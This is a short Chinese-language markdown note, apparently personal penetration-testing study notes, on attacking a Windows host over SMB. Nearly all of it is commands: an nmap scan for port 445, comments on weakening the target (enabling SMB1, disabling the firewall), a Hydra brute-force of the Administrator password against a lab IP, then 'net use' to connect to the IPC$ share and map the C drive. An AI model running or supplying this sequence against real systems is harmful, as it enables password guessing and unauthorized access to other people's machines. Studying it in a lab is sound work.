<!-- 
title: 03-Windows入门
sort: 
--> 

## WIndows

> 提权
>
> [nmap](https://nmap.org/dist/?C=M&O=D)
>
> [Hydra](https://github.com/maaaaz/thc-hydra-windows)

```powershell
# 查看445端口是否开放
nmap -O <addr>

# 开启SMB1支持
# 关闭防火墙
# 开启文件共享

# l 用户名 P 密码 ip 协议 
hydra -l Administrator -P passlist.txt 192.168.252.128 smb

# 连接
net use \\192.168.252.128\ipc$ 1234 /user:Administrator
# 映射
net use x: "\\192.168.252.128\本地磁盘 (C)"


```

